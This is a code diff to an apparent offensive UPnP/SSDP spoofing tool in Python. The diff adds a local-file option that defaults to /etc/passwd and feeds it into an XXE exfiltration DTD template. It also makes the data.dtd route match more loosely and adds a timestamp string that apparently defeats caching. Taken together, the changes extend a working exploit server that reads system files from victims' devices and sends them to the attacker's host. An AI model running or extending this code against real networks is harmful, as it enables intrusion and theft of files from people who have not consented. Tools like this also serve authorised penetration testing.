@@ -29,6 +29,7 @@ try:
     import signal
     import base64
     import random
+    from datetime import datetime
 except ImportError:
     print("\nError importing required modules... Are you using Python3?\n"
           "...you should be.\n")
@@ -52,6 +53,9 @@ print(BANNER)
 if sys.version_info < (3, 0):
     print("\nSorry mate, you'll need to use Python 3+ on this one...\n")
     sys.exit(1)
+
+dt_date = datetime.now()
+random_str = dt_date.strftime("%Y-%m-%d-%H-%M-%S-%f")
 
 
 class PC:
@@ -217,6 +221,7 @@ def build_class(upnp_args):
     realm = upnp_args['realm']
     local_ip = upnp_args['local_ip']
     local_port = upnp_args['local_port']
+    xxe_lfi = upnp_args['xxe_lfi']
 
     class UPNPObject(BaseHTTPRequestHandler):
         """Spoofed UPnP object
@@ -242,10 +247,12 @@ def build_class(upnp_args):
             variables = {'local_ip': local_ip,
                          'local_port': local_port,
                          'smb_server': smb_server,
+                         'random_str': random_str,
                          'session_usn': session_usn}
             file_in = open(template_dir + '/device.xml')
             template = Template(file_in.read())
             xml_file = template.substitute(variables)
+            print(xml_file)
             return xml_file
 
         @staticmethod
@@ -282,14 +289,16 @@ def build_class(upnp_args):
             Builds the required page for data exfiltration when used with the
             xxe-exfil template.
             """
-            if 'xxe-exfil' in template_dir:
-                variables = {'local_ip': local_ip,
-                             'local_port': local_port}
-                file_in = open(template_dir + '/data.dtd')
-                template = Template(file_in.read())
-                exfil_page = template.substitute(variables)
-            else:
-                exfil_page = '.'
+            xxe_tip = re.sub('[^0-9a-zA-Z]+', '.', xxe_lfi)
+            variables = {'local_ip': local_ip,
+                         'local_port': local_port,
+			 'xxe_lfi': xxe_lfi,
+                         'xxe_tip': xxe_tip,
+                         'random_str': random_str}
+            file_in = open(template_dir + '/data.dtd')
+            template = Template(file_in.read())
+            exfil_page = template.substitute(variables)
+            print(exfil_page)
             return exfil_page
 
         def handle(self):
@@ -327,7 +336,7 @@ def build_class(upnp_args):
                 self.send_header('Content-type', 'application/xml')
                 self.end_headers()
                 self.wfile.write('.'.encode())
-            elif self.path == '/ssdp/data.dtd':
+            elif 'data.dtd' in self.path:
                 # Used for XXE exploitation
                 self.send_response(200)
                 self.send_header('Content-type', 'application/xml')
@@ -481,6 +490,10 @@ def process_args():
     parser.add_argument('-p', '--port', type=str, action='store',
                         default=8888,
                         help='Port for HTTP server. Defaults to 8888.')
+    parser.add_argument('-f', '--file', type=str, action='store',
+			default='/etc/passwd',
+			help=('Name of a file for template change'
+			      'useful for caching and turning it off.'))
     parser.add_argument('-t', '--template', type=str, action='store',
                         default='office365',
                         help=('Name of a folder in the templates directory. '
@@ -635,6 +648,7 @@ def main():
                  'redirect_url':args.redirect_url,
                  'is_auth':args.is_auth,
                  'local_ip':local_ip,
+                 'xxe_lfi':args.file,
                  'realm':args.realm,
                  'local_port':args.local_port}
 
